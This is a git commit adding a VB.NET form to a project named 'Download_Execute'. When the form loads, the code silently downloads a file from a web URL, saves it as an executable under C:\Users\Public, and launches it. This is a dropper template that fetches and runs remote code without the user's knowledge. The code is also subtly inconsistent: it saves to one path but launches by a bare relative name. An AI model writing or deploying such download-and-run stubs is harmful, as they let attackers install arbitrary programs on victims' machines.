5b4219f388cb953e87b250728507cbb89a193165
bdunlap9 <baileydunlap9@gmail.com>
2016-11-19 11:28:03 -0500

    Add files via upload

---
+++ Download_Execute/Download_Execute/mainForm.vb
@@ -0,0 +1,13 @@
+﻿Public Class mainForm
+
+    Private Sub mainForm_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        'Download executable
+        My.Computer.Network.DownloadFile(
+       "http://www.cohowinery.com/downloads/WineList.txt",
+       "C:\Users\Public\yourexename.exe")
+
+        'Execute Downloaded File
+        Process.Start("yourexename.exe")
+    End Sub
+
+End Class
